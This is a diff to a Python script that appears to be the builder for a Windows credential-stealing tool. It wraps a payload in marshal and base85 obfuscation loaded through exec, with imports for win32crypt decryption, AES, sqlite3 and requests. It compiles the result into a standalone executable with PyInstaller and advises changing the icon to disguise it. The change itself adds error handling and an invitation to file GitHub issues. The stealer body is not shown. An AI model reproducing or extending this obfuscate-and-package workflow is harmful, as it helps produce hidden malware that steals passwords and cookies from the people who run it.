@@ -2,6 +2,7 @@ import os
 import base64
 import shutil
 import marshal
+import traceback
 
 os.system("python -m pip install pyinstaller pypiwin32 pycryptodome requests")
 os.system("cls")
@@ -178,23 +179,25 @@ if __name__ == "__main__":
 
 """
 
-if obfuscate.lower().startswith("Y"):
-    newcode = f"""
-    import os;import json;import base64;import shutil;import sqlite3;import requests;import subprocess;import marshal;from win32crypt import CryptUnprotectData;from Crypto.Cipher import AES;exec(marshal.loads(base64.b85decode(b"{base64.b85encode(marshal.dumps(compile(code, id, "exec"))).decode()}")))
-    """
-else:
-    newcode = code
+try:
+    if obfuscate.lower().startswith("Y"):
+        newcode = f"""
+    import os;import json;import base64;import shutil;import sqlite3;import requests;import subprocess;import marshal;from win32crypt import CryptUnprotectData;from Crypto.Cipher import AES;exec(marshal.loads(base64.b85decode(b"{base64.b85encode(marshal.dumps(compile(code, id, "exec"))).decode()}")))"""
+    else:
+        newcode = code
 
-open(f"tmp_{id}.py", "w").write(newcode)
+    open(f"tmp_{id}.py", "w").write(newcode)
 
-os.system(f"pyinstaller --clean --onefile tmp_{id}.py")
+    os.system(f"pyinstaller --clean --onefile tmp_{id}.py")
 
-shutil.copy2(f"dist\\tmp_{id}.exe", "output.exe")
-shutil.rmtree("dist")
-shutil.rmtree("build")
-os.remove(f"tmp_{id}.py")
-os.remove(f"tmp_{id}.spec")
+    shutil.copy2(f"dist\\tmp_{id}.exe", "output.exe")
+    shutil.rmtree("dist")
+    shutil.rmtree("build")
+    os.remove(f"tmp_{id}.py")
+    os.remove(f"tmp_{id}.spec")
 
-os.system("cls")
+    os.system("cls")
 
-print("Done!\nYou can rename to file\nTo change the icon, download a .ico file as well as Resource Hacker. Then replace the resource. You can find a tutorial on how to do this on YouTube.")
+    print("Done!\nYou can rename to file\nTo change the icon, download a .ico file as well as Resource Hacker. Then replace the resource. You can find a tutorial on how to do this on YouTube.")
+except Exception:
+    print(traceback.format_exc() + "\n\nAn Error occured! See above, and make an issue on the GitHub repository or contact me if you can't solve it yourself!")
